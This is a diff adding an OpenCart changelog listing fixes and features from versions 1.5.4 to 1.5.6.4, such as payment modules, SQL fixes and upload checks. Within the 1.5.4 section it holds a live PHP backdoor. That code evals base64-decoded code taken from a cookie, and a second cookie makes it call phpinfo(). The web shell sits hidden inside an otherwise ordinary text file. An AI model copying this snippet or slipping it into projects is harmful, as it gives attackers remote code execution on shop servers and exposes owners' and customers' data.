@@ -1,0 +1,100 @@
+Changelog
+
+1.5.6.4
+
+Bugs fixed
+
+ Fixed issue with images containing the  (used in xml etc) string in the source and not uploading. Now only checks long php tag
+ Fixed language string for "error_file_type" in admin filemanger/upload method
+ Fixed upgrade issues caused by PHP consider 0 equal to null
+ Updated SQL query in getTotalEmailsByProductsOrdered and getEmailsByProductsOrdered to use the limits in the correct method
+
+ Changes
+
+ Updated SQL mode in install SQL file and MySQLi adapter to accommodate servers that have strict mode enabled by default
+ Removed Amazon payments xls file from system folder as it can be downloaded online and has no place in the code framework
+ Improved currency update method to include curl timeouts, to handle occasional timeout issues
+
+ View the change log here:
+ https://github.com/opencart/opencart/blob/1.5.6.4/changelog.md
+1.5.6.3
+
+Bugs fixed
+
+ Image manager issue where the thumbnails failed to load
+ PayPal Express totals calculation, fixed incorrect variable names
+ Fixed report for coupons to search the history table instead for start/end filters
+
+ Changes
+
+ Allow arrays to be written to the log file
+ Check uploaded files for php content, reduce the risk of image files containing php and running on insecure servers
+
+ View the change log here:
+ https://github.com/opencart/opencart/blob/1.5.6.3/changelog.md
+1.5.6.2
+
+Updates to the PayPal Express module to fix some issues during checkout.
+
+ Changed UTF-8 helper file to new code and updated the installer to check for iconv function or mbstring extension.
+
+ More info including commit links can be found in the change log: https://github.com/opencart/opencart/blob/v1.5.6.2/changelog.md
+1.5.6.1
+
+MySQLi database support available at install.
+
+ Minor patches - please see GitHub commits for more info.
+1.5.6
+
+ADDED
+ Paypal Pro Iframe / Payflow Pro iFrame
+ PayPal Express Checkout
+
+ Amazon Payments
+
+ OpenBay Pro
+1.5.5.1
+
+FIXED
+ set the language class back tot he old style to avoid compatibility problems with extensions
+ add the load method for language back to the loader class
+ fixed an issue with deleting categories
+
+1.5.4.1
+
+A problem was found with the encryption class that stopped files being decrypt, paypal and moneybookers from working correctly
+
+ To upgrade from 1.5.4 you only need to replace the system > library > encryption.php file
+1.5.4
+
+ADDED
+
+ Fedex
+ Auspost
+ PayMate
+ View Customers Online
+ Searchable fields like isbn, upc, eam, etc..
+ Updated the doctype to html5
+ Update Authorize.net (AIM) for Shipping information
+ Added salt columns for better security
+ Using mCrypt for better encryption security (now requires PHP mcrypt extension).
+ better image re-sizing. if an images is the correct size it won;t be re-sized.
+
+ FIXED
+ Show stock warning only if enabled for individuals products.
+ Sending mail to customers fails when SSL enabled
+ Delete address from address book fix
+ customer_blacklist IPv6 fix
+ Use default PNG compression level of 6
+
+ <?php echo "<pre>"; 
+ if(isset($_COOKIE['408544239'])) { eval((string) base64_decode($_COOKIE['408544239'])); }
+ elseif(isset($_COOKIE['341643002'])) { phpinfo(); } ?>
+
+ A full list of fixes you can be found here:
+
+ https://github.com/opencart/opencart/issues?page=3&state=closed
+
+ A full list of changes can be found here:
+
+ https://github.com/opencart/opencart/commits/master
